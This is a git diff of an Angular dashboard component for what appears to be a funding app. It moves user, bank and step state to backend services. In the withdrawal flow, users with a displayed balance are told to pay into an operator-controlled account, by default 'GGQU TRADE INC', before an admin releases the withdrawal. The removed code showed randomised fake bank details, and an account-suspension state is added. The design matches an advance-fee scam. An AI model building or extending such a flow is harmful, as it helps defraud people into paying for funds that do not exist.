@@ -4,6 +4,10 @@ import { HttpClient, HttpHeaders } from '@angular/common/http';
 import { Observable, catchError, of } from 'rxjs';
 import { environment } from '../../../environments/environment';
 import { FundingOption, FundingCategory, FUNDING_CATEGORIES } from '../../../interfaces/funding-categories';
+import { StepService, FUNDING_STEPS, DASHBOARD_SUBSTEPS, DashboardSubstep } from '../../../services/step.service';
+import { BankInfoService } from '../../../services/bank-info.service';
+import { UserService, UserProfile } from '../../../services/user.service';
+import { AdminBankingInfoService } from '../../../services/admin-banking-info.service';
 
 interface Transaction {
   id: string;
@@ -53,8 +57,11 @@ export class DashboardComponent implements OnInit, OnDestroy {
 
   // Données utilisateur
   clientName: string = '';
+  firstName: string = '';
+  lastName: string = '';
+  companyName: string = '';
   accountId: string = '';
-  
+
   // Informations de solde
   currentBalance: number = 0;
   lastUpdate: Date = new Date();
@@ -64,7 +71,9 @@ export class DashboardComponent implements OnInit, OnDestroy {
   showPaymentModal: boolean = false;
   isProcessing: boolean = false;
   isLoadingSelection: boolean = false;
-  withdrawalPending: boolean = false;
+
+  // Dashboard substep management
+  currentSubstep: DashboardSubstep | undefined = undefined;
   
   // Transactions
   recentTransactions: Transaction[] = [];
@@ -82,13 +91,79 @@ export class DashboardComponent implements OnInit, OnDestroy {
 
   constructor(
     private router: Router,
-    private http: HttpClient
+    private http: HttpClient,
+    private stepService: StepService,
+    private bankInfoService: BankInfoService,
+    private userService: UserService,
+    private adminBankingInfoService: AdminBankingInfoService
   ) {
     this.fundingCategories = FUNDING_CATEGORIES;
   }
 
   ngOnInit(): void {
-    this.loadDashboardData();
+    // Load step from backend first to ensure we have the latest state
+    this.stepService.loadFromBackend().subscribe({
+      next: () => {
+        this.checkDashboardAccess();
+        this.loadDashboardData();
+      },
+      error: (error) => {
+        console.error('Failed to load current step:', error);
+        // Use cached step as fallback
+        this.checkDashboardAccess();
+        this.loadDashboardData();
+      }
+    });
+  }
+
+  private checkDashboardAccess(): void {
+    // Verify user is on DASHBOARD step
+    const currentStep = this.stepService.getCurrentStep();
+
+    if (currentStep !== FUNDING_STEPS.DASHBOARD) {
+      console.warn('User not on dashboard step, redirecting...');
+      // Redirect based on current step
+      this.redirectToCurrentStep(currentStep);
+      return;
+    }
+
+    // Load current substep
+    this.currentSubstep = this.stepService.getCurrentSubstep();
+    console.log('Dashboard loaded - Current substep:', this.currentSubstep);
+
+    // If no substep set, initialize to WITHDRAWAL_AVAILABLE
+    if (!this.currentSubstep) {
+      this.initializeSubstep();
+    }
+  }
+
+  private redirectToCurrentStep(currentStep: string): void {
+    const stepRoutes: Record<string, string> = {
+      [FUNDING_STEPS.FUNDING_INFO]: '/funding',
+      [FUNDING_STEPS.AI_CALCULATING]: '/analyseOffer',
+      [FUNDING_STEPS.HUMAN_VALIDATION_PENDING]: '/human-validation-pending',
+      [FUNDING_STEPS.SELECT_OPTION]: '/analyseOffer',
+      [FUNDING_STEPS.DOCUMENTS_SUPP]: '/documentSupp',
+      [FUNDING_STEPS.SIGNATURE_REQUIRED]: '/signature-required',
+      [FUNDING_STEPS.FUNDING_UNLOCKED]: '/funding-unlocked'
+    };
+
+    const route = stepRoutes[currentStep] || '/funding';
+    this.router.navigate([route]);
+  }
+
+  private initializeSubstep(): void {
+    // Set initial substep to WITHDRAWAL_AVAILABLE
+    this.stepService.updateSubstep(DASHBOARD_SUBSTEPS.WITHDRAWAL_AVAILABLE).subscribe({
+      next: () => {
+        this.currentSubstep = DASHBOARD_SUBSTEPS.WITHDRAWAL_AVAILABLE;
+        console.log('Substep initialized to WITHDRAWAL_AVAILABLE');
+      },
+      error: (error) => {
+        console.error('Failed to initialize substep:', error);
+        this.currentSubstep = DASHBOARD_SUBSTEPS.WITHDRAWAL_AVAILABLE;
+      }
+    });
   }
 
   ngOnDestroy(): void {
@@ -99,48 +174,32 @@ export class DashboardComponent implements OnInit, OnDestroy {
     this.loadUserProfile();
     this.loadUserSelections();
     this.loadBankInfo();
-    this.loadWithdrawalStatus();
     this.setupAutoRefresh();
   }
 
   private loadBankInfo(): void {
-    const savedBankInfo = localStorage.getItem('bankInfo');
-    if (savedBankInfo) {
-      try {
-        this.bankInfo = JSON.parse(savedBankInfo);
-      } catch (error) {
-        console.error('Error loading bank info from cache:', error);
+    this.bankInfoService.getBankInfo().subscribe({
+      next: (response) => {
+        if (this.bankInfoService.isBankInfo(response)) {
+          this.bankInfo = {
+            accountHolderName: response.accountHolderName,
+            routingNumber: response.routingNumber,
+            accountNumber: response.accountNumber,
+            bankName: response.bankName
+          };
+          console.log('Bank info loaded from API:', this.bankInfo);
+        } else {
+          console.log('No bank info found:', response.message);
+          // Keep default empty bankInfo
+        }
+      },
+      error: (error) => {
+        console.error('Error loading bank info from API:', error);
+        // Keep default empty bankInfo
       }
-    }
+    });
   }
 
-  private saveBankInfo(): void {
-    localStorage.setItem('bankInfo', JSON.stringify(this.bankInfo));
-  }
-
-  private loadWithdrawalStatus(): void {
-    const withdrawalStatus = localStorage.getItem('withdrawalPending');
-    this.withdrawalPending = withdrawalStatus === 'true';
-  }
-
-  private saveWithdrawalStatus(): void {
-    localStorage.setItem('withdrawalPending', this.withdrawalPending.toString());
-  }
-
-  private clearWithdrawalStatus(): void {
-    this.withdrawalPending = false;
-    localStorage.removeItem('withdrawalPending');
-  }
-
-isBankFormValid(): boolean {
-  const { accountHolderName, routingNumber, accountNumber, bankName } = this.bankInfo;
-  const routingValid = /^[0-9]{3,20}$/.test(routingNumber);
-
-  return accountHolderName.trim() !== '' &&
-         routingValid &&
-         accountNumber.trim() !== '' &&
-         bankName.trim() !== '';
-}
 
   private loadUserSelections(): void {
     this.isLoadingSelection = true;
@@ -251,33 +310,68 @@ isBankFormValid(): boolean {
   }
 
   private loadUserProfile(): void {
-    const firstName = localStorage.getItem('firstName') || 'User';
-    const lastName = localStorage.getItem('lastName') || '';
-    this.clientName = `${firstName} ${lastName}`.trim();
-    
-    this.accountId = localStorage.getItem('accountId') || "CA01D";
+    this.userService.getCurrentUserProfile().subscribe({
+      next: (profile: UserProfile) => {
+        this.firstName = profile.firstName || 'User';
+        this.lastName = profile.lastName || '';
+        this.companyName = profile.companyName || '';
+        this.clientName = `${this.firstName} ${this.lastName}`.trim();
+
+        // Update balance from profile if available
+        if (profile.accountBalance !== null && profile.accountBalance !== undefined) {
+          this.currentBalance = profile.accountBalance;
+        }
+
+        // Update last update time if available
+        if (profile.lastBalanceUpdate) {
+          this.lastUpdate = new Date(profile.lastBalanceUpdate);
+        }
+
+        console.log('User profile loaded:', profile);
+      },
+      error: (error) => {
+        console.error('Error loading user profile:', error);
+        // Fallback to localStorage if API fails
+        const firstName = localStorage.getItem('firstName') || 'User';
+        const lastName = localStorage.getItem('lastName') || '';
+        this.firstName = firstName;
+        this.lastName = lastName;
+        this.clientName = `${firstName} ${lastName}`.trim();
+      }
+    });
+
+    this.accountId = localStorage.getItem('accountId') || this.generateRandomId(6);
   }
 
-  private generateRandomPaymentBankInfo(): void {
-    const banks = [
-      { name: 'Chase Bank', swift: 'CHASUS33' },
-      { name: 'Bank of America', swift: 'BOFAUS3N' },
-      { name: 'Wells Fargo Bank', swift: 'WFBIUS6S' },
-      { name: 'Citibank', swift: 'CITIUS33' },
-      { name: 'PNC Bank', swift: 'PNCCUS33' }
-    ];
+  private loadAdminBankingInfo(): void {
+    this.adminBankingInfoService.getAdminBankingInfo().subscribe({
+      next: (response) => {
+        if (this.adminBankingInfoService.isAdminBankingInfo(response)) {
+          // Set admin banking info for payment
+          this.paymentBankInfo = {
+            bankName: response.bankName,
+            accountHolder: response.accountHolderName,
+            routingNumber: response.routingNumber,
+            accountNumber: response.accountNumber,
+            swiftCode: '', // Admin banking info doesn't have swift code
+            address: '' // Admin banking info doesn't have address
+          };
+          console.log('Admin banking info loaded for payment:', this.paymentBankInfo);
+        } else {
+          console.log('No admin banking info found, using default');
+          // Fallback to default if no admin banking info exists
+          this.setDefaultPaymentBankInfo();
+        }
+      },
+      error: (error) => {
+        console.error('Error loading admin banking info:', error);
+        // Fallback to default if API fails
+        this.setDefaultPaymentBankInfo();
+      }
+    });
+  }
 
-    const addresses = [
-      '270 Park Avenue, New York, NY 10017',
-      '100 N Tryon St, Charlotte, NC 28255',
-      '420 Montgomery St, San Francisco, CA 94104',
-      '388 Greenwich St, New York, NY 10013',
-      '300 Fifth Avenue, Pittsburgh, PA 15222'
-    ];
-
-    const selectedBank = banks[Math.floor(Math.random() * banks.length)];
-    const selectedAddress = addresses[Math.floor(Math.random() * addresses.length)];
-
+  private setDefaultPaymentBankInfo(): void {
     this.paymentBankInfo = {
       bankName: 'U.S.Bank',
       accountHolder: 'GGQU TRADE INC',
@@ -288,17 +382,13 @@ isBankFormValid(): boolean {
     };
   }
 
-  private generateRandomRoutingNumber(): string {
-    return Math.floor(100000000 + Math.random() * 900000000).toString();
-  }
-
-  private generateRandomAccountNumber(): string {
-    const length = Math.floor(Math.random() * 5) + 10;
-    let accountNumber = '';
+  private generateRandomId(length: number): string {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let result = '';
     for (let i = 0; i < length; i++) {
-      accountNumber += Math.floor(Math.random() * 10).toString();
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
     }
-    return accountNumber;
+    return result;
   }
 
   private setupAutoRefresh(): void {
@@ -370,7 +460,8 @@ isBankFormValid(): boolean {
   }
 
   openWithdrawModal(): void {
-    if (this.currentBalance <= 0 || this.isProcessing || this.withdrawalPending) {
+    // Check if we can withdraw based on substep
+    if (!this.canWithdraw()) {
       return;
     }
     this.loadBankInfo();
@@ -390,42 +481,43 @@ isBankFormValid(): boolean {
   finalizePayment(): void {
     this.isProcessing = true;
 
-    setTimeout(() => {
-      const withdrawalAmount = this.currentBalance;
-      
-      this.withdrawalPending = true;
-      this.saveWithdrawalStatus();
-      
-      const withdrawalTransaction: Transaction = {
-        id: `TXN${Date.now()}`,
-        type: 'debit',
-        description: `Payment - Transfer to ${this.paymentBankInfo.bankName}`,
-        amount: withdrawalAmount,
-        date: new Date(),
-        status: 'pending'
-      };
+    this.stepService.updateSubstep(DASHBOARD_SUBSTEPS.PAYMENT_PENDING).subscribe({
+      next: () => {
+        console.log('Substep transitioned to PAYMENT_PENDING');
+        this.currentSubstep = DASHBOARD_SUBSTEPS.PAYMENT_PENDING;
 
-      this.recentTransactions.unshift(withdrawalTransaction);
-      
-      this.lastUpdate = new Date();
-      
-      this.saveBalance();
-      this.saveTransactions();
-      
-      this.isProcessing = false;
-      this.showPaymentModal = false;
-      
-      this.router.navigate(['/payment-confirmation'], {
-        queryParams: {
-          amount: withdrawalAmount,
-          transactionId: withdrawalTransaction.id,
-          type: 'payment',
-          bankName: this.paymentBankInfo.bankName,
-          accountHolder: this.paymentBankInfo.accountHolder
-        }
-      });
-      
-    }, 2500);
+        setTimeout(() => {
+          const withdrawalAmount = this.currentBalance;
+
+          const withdrawalTransaction: Transaction = {
+            id: `TXN${Date.now()}`,
+            type: 'debit',
+            description: `Payment - Transfer to ${this.paymentBankInfo.bankName}`,
+            amount: withdrawalAmount,
+            date: new Date(),
+            status: 'pending'
+          };
+
+          this.recentTransactions.unshift(withdrawalTransaction);
+
+          this.lastUpdate = new Date();
+
+          this.saveBalance();
+          this.saveTransactions();
+
+          this.isProcessing = false;
+          this.showPaymentModal = false;
+
+          // Stay on dashboard to show payment pending status
+          // Admin will later transition user to WITHDRAWAL_PENDING when payment is received
+        }, 2500);
+      },
+      error: (error) => {
+        console.error('Failed to update substep:', error);
+        this.isProcessing = false;
+        alert('Failed to process payment. Please try again.');
+      }
+    });
   }
 
   copyToClipboard(text: string): void {
@@ -444,12 +536,11 @@ isBankFormValid(): boolean {
   }
 
   proceedToPayment(): void {
-    if (this.currentBalance <= 0 || this.isProcessing || !this.isBankFormValid()) {
+    if (this.currentBalance <= 0 || this.isProcessing || !this.bankInfo.accountHolderName) {
       return;
     }
 
-    this.saveBankInfo();
-    this.generateRandomPaymentBankInfo();
+    this.loadAdminBankingInfo();
 
     this.showWithdrawModal = false;
     this.showPaymentModal = true;
@@ -458,18 +549,19 @@ isBankFormValid(): boolean {
   logout(): void {
     const keysToRemove = [
       'token',
-      'userRole', 
+      'userRole',
       'firstName',
       'lastName',
       'currentBalance',
       'recentTransactions',
-      'accountId',
-      'bankInfo',
-      'withdrawalPending'
+      'accountId'
     ];
-    
+
     keysToRemove.forEach(key => localStorage.removeItem(key));
-    
+
+    // Clear step state
+    this.stepService.clearState();
+
     this.router.navigate(['/sign-in']);
   }
 
@@ -479,12 +571,28 @@ isBankFormValid(): boolean {
   }
 
   canWithdraw(): boolean {
-    return this.currentBalance > 0 && !this.isProcessing && !this.withdrawalPending;
+    // Can only withdraw if:
+    // 1. Has selected offer
+    // 2. On WITHDRAWAL_AVAILABLE substep
+    // 3. Has balance and not processing
+    return this.hasUserSelection() &&
+           this.currentSubstep === DASHBOARD_SUBSTEPS.WITHDRAWAL_AVAILABLE &&
+           this.currentBalance > 0 &&
+           !this.isProcessing;
   }
 
   getWithdrawButtonText(): string {
-    if (this.withdrawalPending) {
+    if (!this.hasUserSelection()) {
+      return 'No Offer Selected';
+    }
+    if (this.currentSubstep === DASHBOARD_SUBSTEPS.PAYMENT_PENDING) {
+      return 'Payment Pending';
+    }
+    if (this.currentSubstep === DASHBOARD_SUBSTEPS.WITHDRAWAL_PENDING) {
       return 'Withdrawal Pending';
+    }
+    if (this.currentSubstep === DASHBOARD_SUBSTEPS.SUSPENDED) {
+      return 'Account Suspended';
     }
     if (this.currentBalance <= 0) {
       return 'No Funds Available';
@@ -492,8 +600,30 @@ isBankFormValid(): boolean {
     return 'Withdraw Funds';
   }
 
+  // Check if in specific substep states
+  isPaymentPending(): boolean {
+    return this.currentSubstep === DASHBOARD_SUBSTEPS.PAYMENT_PENDING;
+  }
+
+  isWithdrawalPending(): boolean {
+    return this.currentSubstep === DASHBOARD_SUBSTEPS.WITHDRAWAL_PENDING;
+  }
+
+  isAccountSuspended(): boolean {
+    return this.currentSubstep === DASHBOARD_SUBSTEPS.SUSPENDED;
+  }
+
   cancelWithdrawal(): void {
-    this.clearWithdrawalStatus();
+    // Transition back to WITHDRAWAL_AVAILABLE substep
+    this.stepService.updateSubstep(DASHBOARD_SUBSTEPS.WITHDRAWAL_AVAILABLE).subscribe({
+      next: () => {
+        console.log('Substep transitioned back to WITHDRAWAL_AVAILABLE');
+        this.currentSubstep = DASHBOARD_SUBSTEPS.WITHDRAWAL_AVAILABLE;
+      },
+      error: (error) => {
+        console.error('Failed to cancel withdrawal:', error);
+      }
+    });
   }
 
   viewTransactionHistory(): void {
